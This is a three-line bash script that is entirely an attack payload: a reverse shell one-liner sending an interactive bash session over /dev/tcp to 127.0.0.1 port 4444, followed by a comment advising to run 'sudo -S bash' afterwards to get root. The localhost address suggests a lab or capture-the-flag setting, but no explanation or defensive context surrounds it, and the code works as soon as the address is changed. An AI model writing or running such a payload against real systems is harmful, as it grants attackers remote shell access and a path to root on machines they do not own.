#!/bin/bash
exec bash >& /dev/tcp/127.0.0.1/4444 0>&1
#after sucess run sudo -S bash to get root
